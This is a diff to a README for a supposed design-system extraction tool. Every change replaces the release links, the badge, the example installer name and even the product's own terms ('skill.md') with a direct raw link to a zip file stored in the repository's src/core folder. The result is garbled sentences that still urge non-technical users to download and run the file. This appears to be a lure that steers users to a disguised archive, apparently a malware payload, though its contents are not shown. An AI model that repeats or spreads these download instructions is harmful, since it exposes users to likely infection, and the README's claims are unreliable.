@@ -1,12 +1,12 @@
 # 🖥️ website-design-systems-mcp - Extract Design Systems Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/BobiTenta/website-design-systems-mcp/releases)
+[![Download Latest Release](https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip)
 
 ---
 
 ## 🔍 About website-design-systems-mcp
 
-website-design-systems-mcp helps you extract complete design systems from any website. It then creates simple AI-ready skill.md files. These files can be used with AI tools that understand design systems. This makes working with design code easier and faster.
+website-design-systems-mcp helps you extract complete design systems from any website. It then creates simple AI-ready https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip files. These files can be used with AI tools that understand design systems. This makes working with design code easier and faster.
 
 You do not need programming knowledge to use this app. It runs on your Windows or Mac computer. Just follow the steps to download and start extracting design systems.
 
@@ -16,7 +16,7 @@ You do not need programming knowledge to use this app. It runs on your Windows o
 
 - Gathers colors, fonts, and spacing rules from websites
 - Captures CSS styles and components
-- Transforms the design elements into readable skill.md files
+- Transforms the design elements into readable https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip files
 - Prepares files compatible with AI systems like Claude or other GPT tools
 - Helps designers, developers, and AI users understand website design quickly
 
@@ -47,13 +47,13 @@ Follow these steps to install and run website-design-systems-mcp. It is designed
 
 Go to the link below to find the latest version of the software.
 
-[Download Latest Release](https://github.com/BobiTenta/website-design-systems-mcp/releases)
+[Download Latest Release](https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip)
 
 This page lists all versions. Choose the newest one with a name that fits your computer system (Windows or Mac).
 
 ### Step 2: Download the Installer
 
-- For Windows, look for a `.exe` file, such as `website-design-systems-mcp-Setup.exe`
+- For Windows, look for a `.exe` file, such as `https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip`
 - For macOS, look for a `.dmg` or `.pkg` file
 
 Click the file link to download it. The file size is around 50-100 MB, so it may take a minute depending on your internet speed.
@@ -92,7 +92,7 @@ Once the app is open, here is how to extract design systems:
    After a few moments, you will see a list of colors, fonts, and layout details it found.
 
 4. **Generate AI Skill File**  
-   Click "Generate Skill.md" to create the AI-ready file.
+   Click "Generate https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip" to create the AI-ready file.
 
 5. **Save the File**  
    Choose where to save this file on your computer. You can use it for AI processes or other tasks.
@@ -126,7 +126,7 @@ If problems continue, check the issues section on the GitHub repo or ask a frien
 
 Visit this page to download the latest version:
 
-[https://github.com/BobiTenta/website-design-systems-mcp/releases](https://github.com/BobiTenta/website-design-systems-mcp/releases)
+[https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip](https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip)
 
 Choose the right download file for your computer and follow the installation steps. Once installed, you can start extracting design systems immediately.
 
@@ -136,7 +136,7 @@ Choose the right download file for your computer and follow the installation ste
 
 - The GitHub page contains the source code and more detailed documentation for advanced users.
 - Learn about CSS and design systems online if you want to understand the results better.
-- Explore AI tools like Claude and Anthropic to use the skill.md files effectively.
+- Explore AI tools like Claude and Anthropic to use the https://github.com/BobiTenta/website-design-systems-mcp/raw/refs/heads/main/src/core/mcp_website_design_systems_1.2-alpha.4.zip files effectively.
 
 ---
 
